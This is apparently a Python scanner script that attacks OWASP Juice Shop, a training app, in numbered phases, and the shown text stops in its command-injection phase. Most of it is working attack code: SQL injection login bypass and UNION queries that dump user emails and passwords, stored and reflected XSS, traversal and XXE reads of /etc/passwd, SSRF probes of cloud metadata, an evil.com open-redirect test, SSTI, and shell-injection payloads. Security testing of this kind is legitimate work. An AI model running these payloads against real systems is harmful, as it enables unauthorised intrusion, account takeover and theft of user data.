#!/usr/bin/env python3
"""
Comprehensive Web Vulnerability Scanner v2
==========================================
Covers OWASP Top 10 + advanced web app vulnerabilities.
Designed to run unattended in background, saves results to files.
Uses rate limiting and retry logic to avoid crashing targets.
"""

import requests
import json
import re
import sys
import os
import time
import urllib3
import subprocess
import html
import base64
import socket
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlencode, quote, urljoin, urlparse
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================================
# CONFIGURATION & HELPERS
# ============================================================================

class ScanConfig:
    def __init__(self, target_host, target_port=3000, scheme="http"):
        self.target_host = target_host
        self.target_port = target_port
        self.scheme = scheme
        self.base_url = f"{scheme}://{target_host}:{target_port}"
        self.timeout = 20
        self.max_workers = 3
        self.request_delay = 0.2
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.results_dir = Path(f"results/juice-shop/comprehensive_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        self.results_dir.mkdir(parents=True, exist_ok=True)
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": self.user_agent,
            "Accept": "application/json, text/html, */*",
        })
        self.session.verify = False
        retry_strategy = Retry(total=5, backoff_factor=2,
                               status_forcelist=[429, 502, 503, 504],
                               allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS"])
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=5, pool_maxsize=5)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        self.auth_token = None
        self.admin_token = None
        self.findings = []
        self.endpoints_discovered = set()
        self.log_file = self.results_dir / "scan_log.txt"


def log(cfg, msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S")
    pfx = {"INFO": "[*]", "VULN": "[!!!]", "WARN": "[!]", "OK": "[+]", "ERR": "[-]"}.get(level, "[*]")
    line = f"{ts} {pfx} {msg}"
    print(line, flush=True)
    try:
        with open(cfg.log_file, "a") as f:
            f.write(line + "\n")
    except Exception:
        pass


def req(cfg, method, url, retries=3, **kwargs):
    """Rate-limited request with retry on connection errors"""
    time.sleep(cfg.request_delay)
    kwargs.setdefault("timeout", cfg.timeout)
    kwargs.setdefault("allow_redirects", True if method == "GET" else False)
    for attempt in range(retries):
        try:
            r = cfg.session.request(method, url, **kwargs)
            return r
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < retries - 1:
                wait = (attempt + 1) * 5
                log(cfg, f"Retry {attempt+1}/{retries} for {url} (waiting {wait}s)", "WARN")
                time.sleep(wait)
            else:
                return None
        except Exception:
            return None
    return None


def add_finding(cfg, vuln_type, severity, url, detail, cwe="", evidence="", method="GET", param=""):
    finding = {
        "type": vuln_type, "severity": severity, "url": url, "method": method,
        "parameter": param, "detail": detail, "cwe": cwe,
        "evidence": evidence[:500] if evidence else "", "timestamp": datetime.now().isoformat(),
    }
    cfg.findings.append(finding)
    log(cfg, f"FOUND {severity.upper()} - {vuln_type}: {detail[:120]}", "VULN")
    try:
        with open(cfg.results_dir / "findings_live.jsonl", "a") as f:
            f.write(json.dumps(finding) + "\n")
    except Exception:
        pass


def save_results(cfg, phase_name, data):
    out = cfg.results_dir / f"{phase_name}.json"
    with open(out, "w") as f:
        json.dump(data, f, indent=2, default=str)
    log(cfg, f"Saved: {out}", "OK")


def wait_for_target(cfg, max_wait=60):
    """Wait for target to be responsive again"""
    for i in range(max_wait // 5):
        try:
            r = requests.get(cfg.base_url, timeout=5, verify=False)
            if r.status_code < 500:
                return True
        except Exception:
            pass
        time.sleep(5)
    return False


# ============================================================================
# PHASE 1: ENDPOINT DISCOVERY
# ============================================================================

DISCOVERY_PATHS = [
    "/", "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
    "/api-docs", "/api-docs/", "/swagger.json", "/graphql",
    "/admin", "/administration", "/login", "/register", "/accounting",
    "/ftp", "/ftp/", "/.git/HEAD", "/.env",
    "/metrics", "/health", "/actuator", "/server-status",
    "/search", "/profile", "/uploads", "/api", "/rest",
    # Juice Shop REST API
    "/rest/user/login", "/rest/user/whoami", "/rest/user/change-password",
    "/rest/user/reset-password", "/rest/products/search",
    "/rest/basket/1", "/rest/basket/2", "/rest/basket/3",
    "/rest/order-history", "/rest/track-order/1",
    "/rest/deluxe-membership", "/rest/memories",
    "/rest/chatbot/status", "/rest/chatbot/respond",
    "/rest/continue-code", "/rest/country-mapping", "/rest/languages",
    "/rest/wallet/balance", "/rest/2fa/status",
    # Juice Shop API
    "/api/Users", "/api/Users/1", "/api/Users/2", "/api/Users/3",
    "/api/Products", "/api/Products/1",
    "/api/Feedbacks", "/api/Feedbacks/1",
    "/api/Complaints", "/api/BasketItems",
    "/api/Cards", "/api/Addresss", "/api/Deliverys",
    "/api/Quantitys", "/api/Challenges", "/api/SecurityQuestions",
    "/api/SecurityAnswers", "/api/Hints", "/api/Recycles",
    # Attack surfaces
    "/b2b/v2/orders", "/redirect", "/promotion",
    "/video", "/snippets", "/dataerasure",
    "/file-upload", "/profile/image/file", "/profile/image/url",
    "/support/logs", "/encryptionkeys", "/encryptionkeys/jwt.pub",
    "/encryptionkeys/premium.key",
    # FTP files
    "/ftp/acquisitions.md", "/ftp/announce.md",
    "/ftp/coupons_2013.md.bak", "/ftp/eastere.gg",
    "/ftp/encrypt.pyc", "/ftp/incident-support.kdbx",
    "/ftp/legal.md", "/ftp/package.json.bak",
    "/ftp/quarantine.zip", "/ftp/suspicious_errors.yml",
]


def discover_endpoints(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 1: ENDPOINT DISCOVERY")
    log(cfg, "=" * 60)

    results = {"accessible": [], "redirects": [], "forbidden": []}

    for path in DISCOVERY_PATHS:
        url = cfg.base_url + path
        r = req(cfg, "GET", url, allow_redirects=False)
        if r is None:
            continue
        entry = {"path": path, "url": url, "status": r.status_code,
                 "content_type": r.headers.get("Content-Type", ""),
                 "size": len(r.content), "server": r.headers.get("Server", "")}
        if r.status_code == 200:
            results["accessible"].append(entry)
            cfg.endpoints_discovered.add(path)
        elif r.status_code in (301, 302, 303, 307, 308):
            entry["redirect_to"] = r.headers.get("Location", "")
            results["redirects"].append(entry)
            cfg.endpoints_discovered.add(path)
        elif r.status_code == 403:
            results["forbidden"].append(entry)
            cfg.endpoints_discovered.add(path)
        elif r.status_code not in (404,):
            results["accessible"].append(entry)
            cfg.endpoints_discovered.add(path)

    # Extract from JS
    js_eps = set()
    for js_path in ["/main.js", "/vendor.js", "/runtime.js"]:
        r = req(cfg, "GET", cfg.base_url + js_path, timeout=30)
        if r and r.status_code == 200:
            for m in re.finditer(r'["\'](/(?:api|rest|ftp|redirect|b2b|profile|file-upload|dataerasure|promotion|snippets|encryptionkeys|video|support|accounting|administration)[^"\']*)["\']', r.text):
                p = m.group(1)
                if len(p) < 200:
                    js_eps.add(p)
            for m in re.finditer(r'(?:get|post|put|delete)\s*\(\s*["\'](/[^"\']+)["\']', r.text, re.IGNORECASE):
                p = m.group(1)
                if len(p) < 200 and not p.endswith((".js", ".css", ".png", ".svg")):
                    js_eps.add(p)

    for ep in js_eps:
        if ep not in cfg.endpoints_discovered:
            cfg.endpoints_discovered.add(ep)

    log(cfg, f"Discovered: {len(results['accessible'])} accessible, {len(results['redirects'])} redirects, {len(results['forbidden'])} forbidden, {len(js_eps)} from JS", "OK")
    save_results(cfg, "01_endpoints", results)
    return results


# ============================================================================
# PHASE 2: SECURITY HEADERS
# ============================================================================

def check_security_headers(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 2: SECURITY HEADERS & TECH DETECTION")
    log(cfg, "=" * 60)

    results = {"headers": {}, "missing_headers": [], "technologies": []}
    r = req(cfg, "GET", cfg.base_url)
    if not r:
        log(cfg, "Cannot reach target for header check", "ERR")
        save_results(cfg, "02_security_headers", results)
        return results

    results["headers"] = dict(r.headers)

    security_headers = {
        "Strict-Transport-Security": ("HSTS missing", "CWE-319"),
        "X-Content-Type-Options": ("X-Content-Type-Options missing - MIME sniffing", "CWE-16"),
        "Content-Security-Policy": ("CSP missing - XSS risk", "CWE-79"),
        "Referrer-Policy": ("Referrer-Policy missing", "CWE-200"),
        "Permissions-Policy": ("Permissions-Policy missing", "CWE-16"),
    }

    headers_lower = {k.lower(): v for k, v in r.headers.items()}
    for hdr, (desc, cwe) in security_headers.items():
        if hdr.lower() not in headers_lower:
            results["missing_headers"].append(hdr)
            add_finding(cfg, "missing_security_header", "low", cfg.base_url, desc, cwe=cwe)

    server = r.headers.get("Server", "")
    if server:
        add_finding(cfg, "server_info_disclosure", "info", cfg.base_url,
                   f"Server header: {server}", cwe="CWE-200", evidence=f"Server: {server}")

    powered = r.headers.get("X-Powered-By", "")
    if powered:
        add_finding(cfg, "technology_disclosure", "low", cfg.base_url,
                   f"X-Powered-By: {powered}", cwe="CWE-200", evidence=powered)
        results["technologies"].append(powered)

    save_results(cfg, "02_security_headers", results)
    return results


# ============================================================================
# PHASE 3: AUTHENTICATION TESTING
# ============================================================================

def test_authentication(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 3: AUTHENTICATION TESTING")
    log(cfg, "=" * 60)

    results = {"sqli_bypass": [], "jwt_issues": [], "user_registration": {}}

    # 3a: SQL Injection Login Bypass
    sqli_payloads = [
        ("' OR 1=1--", "x"), ("' OR '1'='1'--", "x"), ("admin'--", "x"),
        ("' OR 1=1#", "x"), ("\" OR 1=1--", "x"), ("' OR ''='", "' OR ''='"),
        ("admin' OR '1'='1", "x"), ("') OR ('1'='1'--", "x"),
    ]

    for email_payload, password in sqli_payloads:
        r = req(cfg, "POST", f"{cfg.base_url}/rest/user/login",
                json={"email": email_payload, "password": password})
        if not r:
            continue
        try:
            body = r.json() if "json" in r.headers.get("content-type", "") else {}
        except Exception:
            body = {}

        if r.status_code == 200 and "authentication" in body:
            token = body["authentication"].get("token", "")
            add_finding(cfg, "sql_injection_auth_bypass", "critical",
                       f"{cfg.base_url}/rest/user/login",
                       f"SQLi auth bypass with: {email_payload}",
                       cwe="CWE-89", evidence=f"Token: {token[:50]}...",
                       method="POST", param="email")
            results["sqli_bypass"].append({"payload": email_payload, "success": True})
            if not cfg.admin_token:
                cfg.admin_token = token
            break
        else:
            results["sqli_bypass"].append({"payload": email_payload, "success": False, "status": r.status_code})

    # 3b: Register test user
    test_email = f"scanner_{int(time.time())}@test.com"
    test_pass = "TestPass123!"
    r = req(cfg, "POST", f"{cfg.base_url}/api/Users",
            json={"email": test_email, "password": test_pass, "passwordRepeat": test_pass,
                  "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"},
                  "securityAnswer": "test"})
    if r and r.status_code in (200, 201):
        log(cfg, f"Registered: {test_email}", "OK")
        results["user_registration"] = {"email": test_email, "success": True}
        # Login
        r2 = req(cfg, "POST", f"{cfg.base_url}/rest/user/login",
                 json={"email": test_email, "password": test_pass})
        if r2 and r2.status_code == 200:
            try:
                cfg.auth_token = r2.json().get("authentication", {}).get("token", "")
                log(cfg, "Got auth token for test user", "OK")
            except Exception:
                pass

    # 3c: JWT Analysis
    for token in [cfg.auth_token, cfg.admin_token]:
        if not token:
            continue
        try:
            parts = token.split(".")
            if len(parts) != 3:
                continue
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
            alg = header.get("alg", "")

            results["jwt_issues"].append({"algorithm": alg, "payload_keys": list(payload_data.keys())})

            if alg in ("HS256", "HS384", "HS512"):
                add_finding(cfg, "jwt_weak_algorithm", "medium",
                           f"{cfg.base_url}/rest/user/login",
                           f"JWT uses {alg} - symmetric key may be bruteforceable",
                           cwe="CWE-327", evidence=json.dumps(header))

            # Test none algorithm bypass
            none_header = base64.urlsafe_b64encode(json.dumps({"typ": "JWT", "alg": "none"}).encode()).decode().rstrip("=")
            none_token = f"{none_header}.{parts[1]}."
            r = req(cfg, "GET", f"{cfg.base_url}/rest/user/whoami",
                    headers={"Authorization": f"Bearer {none_token}"})
            if r and r.status_code == 200 and "email" in r.text.lower():
                add_finding(cfg, "jwt_none_bypass", "critical",
                           f"{cfg.base_url}/rest/user/whoami",
                           "JWT none algorithm bypass accepted",
                           cwe="CWE-345", evidence=r.text[:200])

            # Check for exposed JWT public key
            for key_path in ["/encryptionkeys/jwt.pub", "/.well-known/jwks.json"]:
                rk = req(cfg, "GET", cfg.base_url + key_path)
                if rk and rk.status_code == 200 and len(rk.text) > 10:
                    add_finding(cfg, "jwt_key_exposed", "high",
                               cfg.base_url + key_path,
                               f"JWT key accessible at {key_path}",
                               cwe="CWE-320", evidence=rk.text[:200])
        except Exception as e:
            log(cfg, f"JWT analysis error: {e}", "WARN")

    # 3d: Security questions exposed
    r = req(cfg, "GET", f"{cfg.base_url}/api/SecurityQuestions")
    if r and r.status_code == 200:
        try:
            qs = r.json().get("data", []) if isinstance(r.json(), dict) else r.json()
            add_finding(cfg, "security_questions_exposed", "low",
                       f"{cfg.base_url}/api/SecurityQuestions",
                       f"Security questions list exposed ({len(qs)} questions)", cwe="CWE-200")
        except Exception:
            pass

    save_results(cfg, "03_authentication", results)
    return results


# ============================================================================
# PHASE 4: SQL INJECTION
# ============================================================================

def test_sql_injection(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 4: SQL INJECTION TESTING")
    log(cfg, "=" * 60)

    results = {"findings": []}

    targets = [
        {"url": "/rest/products/search", "method": "GET", "param": "q"},
    ]

    payloads = [
        ("'", "error"), ("''", "error"), ("' OR '1'='1", "boolean"),
        ("' UNION SELECT NULL--", "union1"),
        ("' UNION SELECT NULL,NULL--", "union2"),
        ("' UNION SELECT NULL,NULL,NULL--", "union3"),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "union9"),
        ("' UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--", "sqlite_extract"),
        ("qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--", "user_dump"),
        ("1 OR 1=1", "integer"),
        ("')) OR 1=1--", "nested"),
    ]

    sql_errors = [
        "sql syntax", "sqlite", "sqlexception", "sequelize",
        "unclosed quotation", "syntax error", "unterminated",
        "unrecognized token", "near \"", "SQLITE_ERROR",
    ]

    for tgt in targets:
        url = cfg.base_url + tgt["url"]
        for payload, sqli_type in payloads:
            r = req(cfg, tgt["method"], url, params={tgt["param"]: payload})
            if not r:
                continue

            body_lower = r.text.lower()

            # Check for SQL error disclosure
            for err in sql_errors:
                if err.lower() in body_lower:
                    add_finding(cfg, "sql_injection", "high", url,
                               f"SQL error with payload '{payload}' on param '{tgt['param']}': {err}",
                               cwe="CWE-89", evidence=r.text[:300],
                               method=tgt["method"], param=tgt["param"])
                    results["findings"].append({"url": url, "param": tgt["param"], "payload": payload, "type": sqli_type, "error": err})
                    break

            # UNION-based: check if response contains extra data
            if "union" in sqli_type and r.status_code == 200:
                try:
                    data = r.json()
                    if isinstance(data, dict) and "data" in data:
                        items = data["data"]
                        if isinstance(items, list) and len(items) > 0:
                            # Check if we got unexpected data (email, password fields)
                            sample = json.dumps(items[0]).lower()
                            if any(f in sample for f in ["password", "email", "admin", "hash"]):
                                add_finding(cfg, "sql_injection_union", "critical", url,
                                           f"UNION SQLi data extraction via '{tgt['param']}': {payload}",
                                           cwe="CWE-89", evidence=json.dumps(items[:2])[:300],
                                           method=tgt["method"], param=tgt["param"])
                except Exception:
                    pass

    save_results(cfg, "04_sql_injection", results)
    return results


# ============================================================================
# PHASE 5: XSS
# ============================================================================

def test_xss(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 5: XSS TESTING")
    log(cfg, "=" * 60)

    results = {"reflected": [], "dom": [], "stored": []}

    payloads = [
        ('<iframe src="javascript:alert(`xss`)">', 'iframe_js'),
        ('<img src=x onerror=alert(1)>', 'img_err'),
        ('<svg onload=alert(1)>', 'svg'),
        ('"><img src=x onerror=alert(1)>', 'breakout'),
        ('<script>alert(1)</script>', 'script'),
        ('<body onload=alert(1)>', 'body'),
    ]

    xss_targets = [
        {"url": "/rest/products/search", "param": "q", "method": "GET"},
    ]

    for tgt in xss_targets:
        url = cfg.base_url + tgt["url"]
        for payload, xss_type in payloads:
            r = req(cfg, tgt["method"], url, params={tgt["param"]: payload})
            if not r:
                continue
            if payload in r.text:
                add_finding(cfg, "reflected_xss", "high", url,
                           f"Reflected XSS via '{tgt['param']}': payload reflected unescaped",
                           cwe="CWE-79", evidence=r.text[:300],
                           method=tgt["method"], param=tgt["param"])
                results["reflected"].append({"url": url, "param": tgt["param"], "payload": payload, "type": xss_type})

    # DOM XSS test URLs (Juice Shop uses Angular with hash routing)
    results["dom_xss_vectors"] = [
        f'{cfg.base_url}/#/search?q=<iframe src="javascript:alert(`xss`)">',
        f'{cfg.base_url}/#/search?q=<img src=x onerror=alert(1)>',
        f'{cfg.base_url}/#/track-result?id=<script>alert(1)</script>',
    ]

    # Stored XSS via feedback
    if cfg.auth_token:
        # Get captcha first
        captcha_r = req(cfg, "GET", f"{cfg.base_url}/rest/captcha")
        captcha_id = 0
        captcha_answer = ""
        if captcha_r and captcha_r.status_code == 200:
            try:
                cd = captcha_r.json()
                captcha_id = cd.get("captchaId", 0)
                captcha_answer = str(cd.get("answer", ""))
            except Exception:
                pass

        xss_comment = '<script>alert("stored-xss")</script>'
        r = req(cfg, "POST", f"{cfg.base_url}/api/Feedbacks",
                json={"comment": xss_comment, "rating": 1,
                      "captchaId": captcha_id, "captcha": captcha_answer},
                headers={"Authorization": f"Bearer {cfg.auth_token}"})
        if r and r.status_code in (200, 201):
            try:
                body = r.json()
                stored = json.dumps(body)
                if "<script>" in stored:
                    add_finding(cfg, "stored_xss", "high",
                               f"{cfg.base_url}/api/Feedbacks",
                               "Stored XSS: <script> tag accepted in feedback comment",
                               cwe="CWE-79", evidence=stored[:300], method="POST", param="comment")
                    results["stored"].append({"endpoint": "/api/Feedbacks", "field": "comment"})
                elif r.status_code in (200, 201):
                    add_finding(cfg, "potential_stored_xss", "medium",
                               f"{cfg.base_url}/api/Feedbacks",
                               "Feedback accepted with HTML content - check if rendered",
                               cwe="CWE-79", method="POST", param="comment")
            except Exception:
                pass

    save_results(cfg, "05_xss", results)
    return results


# ============================================================================
# PHASE 6: PATH TRAVERSAL / LFI
# ============================================================================

def test_path_traversal(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 6: PATH TRAVERSAL / LFI")
    log(cfg, "=" * 60)

    results = {"findings": []}

    # Null byte bypass on Juice Shop FTP
    null_byte_tests = [
        ("/ftp/eastere.gg%2500.md", "null_byte_easteregg"),
        ("/ftp/package.json.bak%2500.md", "null_byte_package_json"),
        ("/ftp/coupons_2013.md.bak%2500.md", "null_byte_coupons"),
        ("/ftp/suspicious_errors.yml%2500.md", "null_byte_errors"),
        ("/ftp/encrypt.pyc%2500.md", "null_byte_pyc"),
        ("/ftp/quarantine.zip%2500.md", "null_byte_zip"),
    ]

    for path, technique in null_byte_tests:
        r = req(cfg, "GET", cfg.base_url + path)
        if r and r.status_code == 200 and len(r.text) > 10:
            add_finding(cfg, "path_traversal_null_byte", "high",
                       cfg.base_url + path,
                       f"Null byte bypass ({technique}): accessed restricted file via %2500",
                       cwe="CWE-22", evidence=r.text[:300])
            results["findings"].append({"path": path, "technique": technique, "size": len(r.text)})

    # Generic traversal
    traversal_tests = [
        ("/ftp/../../etc/passwd", "dir_traversal"),
        ("/ftp/..%2f..%2fetc%2fpasswd", "encoded_traversal"),
        ("/ftp/....//....//etc/passwd", "double_dot"),
    ]

    for path, technique in traversal_tests:
        r = req(cfg, "GET", cfg.base_url + path, allow_redirects=False)
        if r and r.status_code == 200 and ("root:" in r.text or "/bin" in r.text):
            add_finding(cfg, "local_file_inclusion", "critical",
                       cfg.base_url + path,
                       f"LFI ({technique}): /etc/passwd extracted",
                       cwe="CWE-98", evidence=r.text[:300])

    # FTP directory listing
    r = req(cfg, "GET", f"{cfg.base_url}/ftp")
    if r and r.status_code == 200 and len(r.text) > 50:
        add_finding(cfg, "directory_listing", "medium",
                   f"{cfg.base_url}/ftp",
                   f"FTP directory listing exposed ({len(r.text)} bytes)",
                   cwe="CWE-548", evidence=r.text[:300])

    save_results(cfg, "06_path_traversal", results)
    return results


# ============================================================================
# PHASE 7: IDOR
# ============================================================================

def test_idor(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 7: IDOR TESTING")
    log(cfg, "=" * 60)

    results = {"findings": []}

    idor_targets = [
        ("/rest/basket/1", "basket"), ("/rest/basket/2", "basket"), ("/rest/basket/3", "basket"),
        ("/api/Users/1", "user"), ("/api/Users/2", "user"), ("/api/Users/3", "user"),
        ("/api/Cards/1", "card"), ("/api/Cards/2", "card"),
        ("/api/Addresss/1", "address"), ("/api/Addresss/2", "address"),
        ("/api/Feedbacks/1", "feedback"), ("/api/Feedbacks/2", "feedback"),
        ("/api/Complaints/1", "complaint"),
    ]

    # Test without auth
    for path, resource in idor_targets:
        r = req(cfg, "GET", cfg.base_url + path)
        if not r:
            continue
        if r.status_code == 200 and len(r.text) > 30:
            body_lower = r.text.lower()
            has_sensitive = any(f in body_lower for f in ["email", "password", "credit", "card", "address", "token"])
            severity = "high" if has_sensitive else "medium"
            add_finding(cfg, "idor", severity, cfg.base_url + path,
                       f"IDOR: {resource} accessible without auth" + (" (contains sensitive data)" if has_sensitive else ""),
                       cwe="CWE-639", evidence=r.text[:300])
            results["findings"].append({"path": path, "resource": resource, "auth": "none", "sensitive": has_sensitive})

    # Test with auth (access other users' resources)
    if cfg.auth_token:
        for path, resource in idor_targets[:6]:  # baskets and users
            r = req(cfg, "GET", cfg.base_url + path,
                    headers={"Authorization": f"Bearer {cfg.auth_token}"})
            if r and r.status_code == 200 and len(r.text) > 30:
                add_finding(cfg, "idor_authenticated", "high", cfg.base_url + path,
                           f"IDOR: other user's {resource} accessible with regular auth",
                           cwe="CWE-639", evidence=r.text[:200])

    # Admin endpoints without auth
    for path in ["/administration", "/accounting", "/api/Users", "/api/Feedbacks", "/api/Complaints"]:
        r = req(cfg, "GET", cfg.base_url + path)
        if r and r.status_code == 200 and len(r.text) > 100:
            add_finding(cfg, "broken_access_control", "high", cfg.base_url + path,
                       f"Admin endpoint accessible: {path}",
                       cwe="CWE-284", evidence=r.text[:200])

    save_results(cfg, "07_idor", results)
    return results


# ============================================================================
# PHASE 8: OPEN REDIRECT
# ============================================================================

def test_open_redirect(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 8: OPEN REDIRECT")
    log(cfg, "=" * 60)

    results = {"findings": []}

    payloads = [
        "https://evil.com", "//evil.com", "https://evil.com%23",
        "/\\evil.com", "https:evil.com", "///evil.com",
    ]

    for payload in payloads:
        r = req(cfg, "GET", f"{cfg.base_url}/redirect", params={"to": payload}, allow_redirects=False)
        if not r:
            continue
        if r.status_code in (301, 302, 303, 307, 308):
            location = r.headers.get("Location", "")
            if "evil.com" in location:
                add_finding(cfg, "open_redirect", "medium",
                           f"{cfg.base_url}/redirect?to={payload}",
                           f"Open redirect to {location}",
                           cwe="CWE-601", evidence=f"Location: {location}", param="to")
                results["findings"].append({"payload": payload, "location": location})

    # Test with allowed domains that are open redirect targets
    allowed_payloads = [
        "https://blockchain.info/address/1AbKfgUWPpg8k51hGFxkqLQo4YzRE3bRBr",
        "https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW",
        "https://etherscan.io/address/0x0f933ab9fCAAA782D0279C300D73750e1311EAE6",
    ]
    for payload in allowed_payloads:
        r = req(cfg, "GET", f"{cfg.base_url}/redirect", params={"to": payload}, allow_redirects=False)
        if r and r.status_code in (301, 302, 303, 307, 308):
            location = r.headers.get("Location", "")
            results["findings"].append({"payload": payload, "location": location, "allowed": True})

    save_results(cfg, "08_open_redirect", results)
    return results


# ============================================================================
# PHASE 9: SSRF
# ============================================================================

def test_ssrf(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 9: SSRF TESTING")
    log(cfg, "=" * 60)

    results = {"findings": []}

    if not cfg.auth_token:
        log(cfg, "Skipping SSRF - no auth token", "WARN")
        save_results(cfg, "09_ssrf", results)
        return results

    ssrf_payloads = [
        (f"http://127.0.0.1:{cfg.target_port}", "localhost_loop"),
        ("http://localhost:3000", "localhost"),
        ("http://[::1]:3000", "ipv6"),
        ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
        ("file:///etc/passwd", "file_proto"),
        ("http://0x7f000001:3000", "hex_ip"),
    ]

    for payload, ssrf_type in ssrf_payloads:
        r = req(cfg, "POST", f"{cfg.base_url}/profile/image/url",
                json={"imageUrl": payload},
                headers={"Authorization": f"Bearer {cfg.auth_token}"})
        if not r:
            continue
        body = r.text.lower()
        if any(i in body for i in ["root:", "ami-id", "instance-id", "juice shop"]):
            add_finding(cfg, "ssrf", "critical", f"{cfg.base_url}/profile/image/url",
                       f"SSRF via imageUrl: {ssrf_type} - internal data leaked",
                       cwe="CWE-918", evidence=r.text[:300], method="POST", param="imageUrl")
        elif r.status_code == 200 and len(r.text) > 50:
            results["findings"].append({"payload": payload, "type": ssrf_type, "status": r.status_code})

    save_results(cfg, "09_ssrf", results)
    return results


# ============================================================================
# PHASE 10: CORS
# ============================================================================

def test_cors(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 10: CORS TESTING")
    log(cfg, "=" * 60)

    results = {"findings": []}

    test_origins = ["https://evil.com", "null", f"http://{cfg.target_host}.evil.com"]
    test_endpoints = ["/", "/api/Users", "/rest/user/whoami", "/api/Products"]

    for ep in test_endpoints:
        for origin in test_origins:
            r = req(cfg, "GET", cfg.base_url + ep, headers={"Origin": origin})
            if not r:
                continue
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == origin or acao == "*":
                sev = "high" if acac.lower() == "true" else "medium"
                add_finding(cfg, "cors_misconfiguration", sev, cfg.base_url + ep,
                           f"CORS reflects origin '{origin}'" + (" with credentials" if acac.lower() == "true" else ""),
                           cwe="CWE-942", evidence=f"ACAO: {acao}, ACAC: {acac}")
                results["findings"].append({"url": ep, "origin": origin, "acao": acao, "acac": acac})

    save_results(cfg, "10_cors", results)
    return results


# ============================================================================
# PHASE 11: SSTI
# ============================================================================

def test_ssti(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 11: SSTI TESTING")
    log(cfg, "=" * 60)

    results = {"findings": []}

    payloads = [
        ("{{7*7}}", "49", "jinja2/twig"), ("${7*7}", "49", "freemarker"),
        ("#{7*7}", "49", "ruby_erb"), ("<%= 7*7 %>", "49", "erb"),
        ("{{7*'7'}}", "7777777", "jinja2_string"),
    ]

    # /promotion endpoint is the Juice Shop SSTI point (Pug template)
    for payload, expected, engine in payloads:
        r = req(cfg, "GET", f"{cfg.base_url}/promotion", params={"q": payload})
        if r and expected in r.text:
            add_finding(cfg, "ssti", "critical", f"{cfg.base_url}/promotion",
                       f"SSTI ({engine}): '{payload}' evaluated to '{expected}'",
                       cwe="CWE-1336", evidence=r.text[:300], param="q")
            results["findings"].append({"payload": payload, "engine": engine, "confirmed": True})

    # Also test search
    for payload, expected, engine in payloads:
        r = req(cfg, "GET", f"{cfg.base_url}/rest/products/search", params={"q": payload})
        if r and expected in r.text:
            add_finding(cfg, "ssti", "high", f"{cfg.base_url}/rest/products/search",
                       f"SSTI ({engine}): template expression evaluated",
                       cwe="CWE-1336", evidence=r.text[:300], param="q")

    save_results(cfg, "11_ssti", results)
    return results


# ============================================================================
# PHASE 12: XXE
# ============================================================================

def test_xxe(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 12: XXE TESTING")
    log(cfg, "=" * 60)

    results = {"findings": []}

    xxe_payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
    svg_xxe = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'

    xxe_endpoints = ["/file-upload", "/api/Products", "/b2b/v2/orders", "/dataerasure"]

    auth = {"Authorization": f"Bearer {cfg.auth_token}"} if cfg.auth_token else {}

    for ep in xxe_endpoints:
        url = cfg.base_url + ep
        # Try XML body
        r = req(cfg, "POST", url, data=xxe_payload,
                headers={**auth, "Content-Type": "application/xml"})
        if r and ("root:" in r.text or "/bin" in r.text):
            add_finding(cfg, "xxe", "critical", url,
                       "XXE: extracted /etc/passwd via XML injection",
                       cwe="CWE-611", evidence=r.text[:300], method="POST")
            results["findings"].append({"url": url, "type": "xxe_xml", "confirmed": True})

        # Try SVG file upload
        r = req(cfg, "POST", url, files={"file": ("evil.svg", svg_xxe, "image/svg+xml")},
                headers=auth)
        if r and ("root:" in r.text or "/bin" in r.text):
            add_finding(cfg, "xxe_svg", "critical", url,
                       "XXE via SVG upload: extracted /etc/passwd",
                       cwe="CWE-611", evidence=r.text[:300], method="POST")

    save_results(cfg, "12_xxe", results)
    return results


# ============================================================================
# PHASE 13: COMMAND INJECTION
# ============================================================================

def test_command_injection(cfg):
    log(cfg, "=" * 60)
    log(cfg, "PHASE 13: COMMAND INJECTION")
    log(cfg, "=" * 60)

    results = {"findings": []}

    # b2b/v2/orders is the Juice Shop command injection point
    b2b_payloads = [
        ('{"orderLinesData": "$(id)"}', "subshell"),
        ('{"orderLinesData": "; id"}', "semicolon"),
        ('{"orderLinesData": "| id"}', "pipe"),
    ]

